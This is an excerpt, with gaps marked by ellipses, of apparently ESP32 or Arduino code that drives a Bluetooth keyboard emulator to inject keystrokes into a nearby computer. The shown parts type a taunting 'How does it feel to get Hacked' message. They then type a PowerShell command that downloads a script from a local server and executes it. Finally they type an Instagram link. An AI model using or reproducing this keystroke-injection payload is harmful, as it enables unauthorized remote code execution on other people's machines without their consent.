...
bleKeyboard.releaseAll();
delay(1000);
const char* txt = "How does it feel to get Hacked!!! Hn?";
...
bleKeyboard.releaseAll();
delay(5000);
const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.10/done.ps1')";
...
bleKeyboard.releaseAll();
delay(1000);
const char* cmd = "https://www.instagram.com/q3hr_mvp?igsh=YXZwOW4xbThwYW85&utm_source=qr";
for (int i=0; i < strlen(cmd); i++) {
bleKeyboard.print(cmd[i]);
delay(10);
}
